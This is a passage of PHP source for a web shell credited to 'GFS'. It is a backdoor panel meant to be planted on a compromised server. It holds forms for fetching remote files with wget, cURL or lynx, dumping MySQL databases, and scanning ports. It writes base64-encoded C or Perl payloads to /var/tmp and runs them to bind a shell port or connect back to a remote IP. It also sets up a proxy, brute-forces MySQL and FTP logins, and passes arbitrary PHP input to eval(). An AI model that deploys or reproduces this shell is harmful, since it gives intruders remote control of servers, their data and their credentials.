 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Upload files: </b></td></tr><font size=-2>";
 if ($box==""){ $box="fopen";}
 echo ("<tr><td alling=\"center\"><b>Use/from: </b><SELECT name=\"box\">");
 echo("<OPTION>$box</option>");
 echo("<OPTION value=\"PC\">PC</option>
       <option value=\"WGET\">WGET</option><option value=\"FETCH\">
       FETCH</option><option value=\"LYNX\">LYNX</option>
       <option value=\"cURL\">cURL</option>
       <option value=\"fopen\">fopen</option></select></td></tr>");
 echo "<tr><td alling=\"center\"><b>File: </b><input type=\"text\" name=\"lfilename\" size=50></td></tr>";
 echo "<tr><td alling=\"center\"><b>Target: </b><input type=\"text\" name=\"tfilename\"
      size=30  value=\"$tfilename\"></td></tr>";
 echo "<tr><td alling=\"center\"><input type=\"submit\" name=\"b_upload\" value=\"UPLOAD\"></td></tr></table></form></font></font>";
 echo "<hr size=3 color=black>";
##################### MySQL ####################################################
 if(isset($_POST['host'])){
  $host=$_POST['host'];
 }
 if(isset($_POST['dbname'])){
  $dbname=$_POST['dbname'];
 }
 if(isset($_POST['tablename'])){
  $tablename=$_POST['tablename'];
 }
 if(isset($_POST['sql'])){
  $sql=$_POST['sql'];
 }
 if(isset($_POST['sfilename'])){
  $filename=$_POST['sfilename'];
 }
 if(isset($_POST['dfilename'])){
  $dfilename=$_POST['dfilename'];
 }
 if(isset($_POST['username'])){
  $username=$_POST['username'];
 }
 if(isset($_POST['pass'])){
  $pass=$_POST['pass'];
 }
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>MySQL DB connect: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><b>Host name:</b></td>";
 echo "<td alling=\"center\"><b>DB name:</b></td>";
 echo "<td alling=\"center\"><b>Table name:</b></td>";
 echo "<td alling=\"center\"><b>SQL command: </b></td></tr>";
 echo ("<tr><td alling=\"center\"><input type=\"text\" name=\"host\" value=\"$host\"></td>");
 echo ("<td alling=\"center\"><input type=\"text\" name=\"dbname\" value=\"$dbname\"></td>");
 echo ("<td alling=\"center\"><input type=\"text\" name=\"tablename\" value=\"$tablename\"></td>");
 echo ("<td alling=\"center\"><input type=\"text\" name=\"sql\" value=\"$sql\"></td></tr>");
 echo "<tr><td alling=\"center\"><b>User name:</b></tb>";
 echo "<td alling=\"center\"><input type=\"submit\" name=\"b_base\" value=\"Dump DB\"></td>";
 echo "<td alling=\"center\"><input type=\"submit\" name=\"b_table\" value=\"Dump table\"></td>";
 echo "<td alling=\"center\"><input type=\"submit\" name=\"b_runsql\" value=\"Run SQL\"></tb></tr>";
 echo ("<tr><td alling=\"center\"><input type=\"text\" name=\"username\" value=\"$username\"></td><td alling=\"center\"></td><td alling=\"center\"><input type=\"submit\" name=\"b_dtable\" value=\"Download\"></td></tr>");
 echo "<tr><td alling=\"center\"><b>Pass: </b></td>";
 if ($safe_mode){
  echo "<td alling=\"center\"><b>OpenFilename: </b></td><td alling=\"center\"><b>DumpFilename: </b></td></tr>";
 }else
  echo "<td alling=\"center\"></td><td alling=\"center\"><b>DumpFilename: </b></td></tr>";
 echo ("<tr><td alling=\"center\"><input type=\"text\" name=\"pass\" value=\"$pass\"></td>");
 if ($safe_mode){
  echo "<td alling=\"center\"><input type=\"text\" name=\"sfilename\" value=\"$filename\"></td><td alling=\"center\"><input type=\"text\" name=\"b_dfilename\" value=\"$dfilename\"></td></tr>";
 }else
  echo "<td alling=\"center\"></td><td alling=\"center\"><input type=\"text\" name=\"dfilename\" value=\"$dfilename\"></td></tr>";
 echo ("<tr><td alling=\"center\"><input type=\"submit\" name=\"b_mydb\" value=\"Show exists DB\"></td>");
 if ($safe_mode){
  echo ("<td alling=\"center\"><input type=\"submit\" name=\"b_safe_fuck\" value=\"SafeMode FileOpen\"></td>");
 }else
  echo "<td alling=\"center\"></td>";
 echo("<td alling=\"center\"><input type=\"submit\" name=\"b_dfilename\" value=\"Dump table\"></td>");
 echo "</tr></table></font></font>";
 echo "<hr size=3 color=black>";
################## NAVIGATION ##################################################
 list_dir();
}
##################### PortScan #################################################
if($r_act=="port"){
 if($_POST['host']==""){
  $host="localhost";
 }else
  $host=$_POST['host'];
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Scan host: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"".$host."\" name=\"host\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Scan\" name=\"b_scan\"></td></tr>";
 echo "</tr></table></form>";
 if($_POST['b_scan']){
  portscan($host);
 }
}
##################### PortBind #################################################
if($r_act=="bind"){
 if($_POST['b_bind']){
  if($_POST['box']=="C++"){
   save_file(base64_decode($port_c),"/var/tmp/gfs.c",getcwd());
   ex("gcc /var/tmp/gfs.c");
   unlink("/var/tmp/gfs.c");
   ex("/var/tmp/a.out ".$_POST['port']." &");
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center><b>".$s."</b></td></tr>";
   echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
   echo ex("ps -aux | grep a.out");
   echo "</textarea></td></tr></table>";
  }
  if($_POST['box']=="Perl"){
   save_file(base64_decode($port_pl),"/var/tmp/gfs.pl",getcwd());
   ex("perl /var/tmp/gfs.pl ".$_POST['port']." &");
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center><b>".$s."</b></td></tr>";
   echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
   echo ex("ps -aux | grep gfs.pl");
   echo "</textarea></td></tr></table>";
  }
 }
 if($_POST['b_connect']){
  if($_POST['box']=="C++"){
   save_file(base64_decode($back_connect_c),"/var/tmp/gfs.c",getcwd());
   ex("gcc -o /var/tmp/gfs.c /var/tmp/gfs");
   unlink("/var/tmp/gfs.c");
   ex("/var/tmp/gfs ".$_POST['ip']." ".$_POST['port']." &");
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center><b>".$s."</b></td></tr>";
   echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
   echo "Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...";
   echo "</textarea></td></tr></table>";
  }
  if($_POST['box']=="Perl"){
   save_file(base64_decode($back_connect_pl),"/var/tmp/gfs.pl",getcwd());
   ex("perl /var/tmp/gfs.pl ".$_POST['ip']." ".$_POST['port']." &");
   echo "<table BORDER=1 align=center>";
   echo "<tr><td alling=center><b>".$s."</b></td></tr>";
   echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
   echo "Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...";
   echo "</textarea></td></tr></table>";
  }
 }
 if($_POST['b_proxy']){
  save_file(stripslashes(base64_decode($prx1).$_POST['port'].base64_decode($prx2)),"/var/tmp/gfs.pl",getcwd());
  ex("perl /var/tmp/gfs.pl");
  echo "<table BORDER=1 align=center>";
  echo "<tr><td alling=center><b>Proxy</b></td></tr>";
  echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
  echo ex("ps -aux | grep gfs.pl");
  echo "</textarea></td></tr></table>";
 }
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Bind Port: </b></td></tr><font size=-2>";
 echo ("<tr><td alling=\"center\"><b>Use: </b><SELECT name=\"box\">");
 echo("<OPTION value=\"C++\">C++</option>
       <option value=\"Perl\">Perl</option></select></td></tr>");
 echo "<tr><td alling=\"center\"><b><font  face=Verdana size=2>BindPort: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"26660\" name=\"port\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Bind\" name=\"b_bind\"></td></tr>";
 echo "</tr></table></form>";
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Back connect: </b></td></tr><font size=-2>";
 echo ("<tr><td alling=\"center\"><b>Use: </b><SELECT name=\"box\">");
 echo("<OPTION value=\"C++\">C++</option>
       <option value=\"Perl\">Perl</option></select></td></tr>");
 echo "<tr><td alling=\"center\"><b><font  face=Verdana size=2>RemotePort: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"26660\" name=\"port\"></td></tr>";
 echo "<tr><td alling=\"center\"><b><font  face=Verdana size=2>RemoteIp: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"".$REMOTE_ADDR."\" name=\"ip\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Connect\" name=\"b_connect\"></td></tr>";
 echo "</tr></table></form>";
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>HTTPProxy: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><b><font  face=Verdana size=2>ProxyPort: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><input style='width:300px;' type=\"text\" value=\"46660\" name=\"port\"></td><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Create\" name=\"b_proxy\"></td></tr>";
 echo "</tr></table></form>";
}
##################### Brute ####################################################
if($r_act=="brute"){
 if(isset($_POST['brute_host'])){
  $host=$_POST['brute_host'];
 }else
  $host="localhost";
 if(isset($_POST['lib'])){
  $lib=$_POST['lib'];
 }else
  $lib="  [library]";
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Brute: </b></td></tr><font size=-2>";
 echo "<tr bgcolor=#00ff00><td alling=\"center\"><b>Example lib: </b>login:pass</td></tr>";
 echo ("<tr><td alling=\"center\"><b>Bryte type: </b><SELECT name=\"box1\">");
 echo("<option value=\"login:login\">login:login</option>
       <option value=\"login:nigol\">login:nigol</option>
       <option value=\"login:empty\">login:empty</option>
       <option value=\"login:number\">login:number</option>");
 if(function_exists(fopen)){
  echo "<option value=\"login:lib\">login:lib</option>";
  echo "<option value=\"lib:lib\">lib:lib</option>";
 }
 echo ("</select></td></tr>");
 echo ("<tr><td alling=\"center\"><b>Use: </b><SELECT name=\"box\">");
 echo("<OPTION value=\"mysql\">mysql</option>
       <option value=\"ftp\">ftp</option>");
// if(function_exists(ssh2_connect)){
//  echo "<option value=\"ssh\">ssh</option>";
// }
 echo ("</select></td>");
 echo("<td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Brute\" name=\"b_brute\"></td></tr><tr><td alling=\"center\"><b>Host: </b><input type=\"text\" name=\"brute_host\" value=\"".$host."\">(for lib:lib)</td></tr>");
 if(function_exists(fopen)){
  echo "<td alling=\"center\"><b>From lib (if set): <input type=\"text\" name=\"lib\" value=\"".$lib."\">";
 }
 echo ("</table></form>");
 if($_POST['b_brute']){
  brute($_POST['box'],$_POST['box1'],$_POST['brute_host'],$_POST['lib']);
 }
}
#################### Eval ######################################################
if($r_act=="eval"){
 if($_POST['b_eval']){
  $eval=str_replace("<?","",$_POST['php_eval']);
  $eval=str_replace("?>","",$eval);
  eval($eval);
 }
 echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
 echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
 echo "<table BORDER=1 align=center>";
 echo "<tr bgcolor=#ffff00><td alling=\"center\"><b><font  face=Verdana size=2>Eval php: </b></td></tr><font size=-2>";
 echo "<tr><td alling=\"center\"><textarea name=\"php_eval\" cols=90 rows=15></textarea></td></tr><tr><td alling=\"center\"><input style='width:100px;' type=\"submit\" value=\"Eval\" name=\"b_eval\"></td></tr>";
 echo "</tr></table></form>";
}

echo "<hr size=3 color=black>";
echo "<font  face=Verdana size=2 color=blue><b>";
echo (rep_char("&nbsp",15));
echo "(c) GFS</font>";
echo (rep_char("&nbsp",15));
echo "<a href=\"http://www.gfs-team.ru\">www.gfs-team.ru</a>";
echo "<hr size=3 color=black>";
?>
